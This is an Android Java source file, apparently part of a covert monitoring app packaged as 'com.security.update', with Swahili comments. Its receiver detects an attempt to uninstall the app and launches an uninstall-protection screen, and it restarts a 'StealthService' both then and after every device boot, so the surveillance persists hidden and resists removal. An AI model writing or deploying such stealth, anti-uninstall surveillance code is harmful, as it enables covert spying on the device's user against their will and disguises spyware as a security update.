package com.security.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;

public class UninstallReceiver extends BroadcastReceiver {
    private static final String TAG = "UninstallReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        if (action != null && action.equals("android.intent.action.QUERY_PACKAGE_RESTART")) {
            Log.d(TAG, "⚠️ Mtu anajaribu kufuta app!");
            
            SharedPreferences prefs = context.getSharedPreferences("SurveillanceApp", Context.MODE_PRIVATE);
            String parentCode = prefs.getString("parent_code", "");
            
            if (!parentCode.isEmpty()) {
                // 🚨 ANZA UNINSTALL PROTECTION ACTIVITY
                Intent protectionIntent = new Intent(context, UninstallProtectionActivity.class);
                protectionIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(protectionIntent);
                
                Log.d(TAG, "🔒 Uninstall protection imeshtakiwa");
                
                // 🔄 RUDISHA STEALTH SERVICE
                Intent serviceIntent = new Intent(context, StealthService.class);
                serviceIntent.putExtra("PARENT_CODE", parentCode);
                context.startService(serviceIntent);
            }
        }
        
        // 🛡️ POKEA BOOT COMPLETED PIA
        if (action != null && action.equals("android.intent.action.BOOT_COMPLETED")) {
            Log.d(TAG, "📱 Device imewashwa - kuanzisha surveillance...");
            
            SharedPreferences prefs = context.getSharedPreferences("SurveillanceApp", Context.MODE_PRIVATE);
            String parentCode = prefs.getString("parent_code", "");
            boolean isVerified = prefs.getBoolean("code_verified", false);

            if (!parentCode.isEmpty() && isVerified) {
                Intent serviceIntent = new Intent(context, StealthService.class);
                serviceIntent.putExtra("PARENT_CODE", parentCode);
                context.startService(serviceIntent);
                Log.d(TAG, "✅ StealthService imeshtakiwa baada ya boot");
            }
        }
    }
}
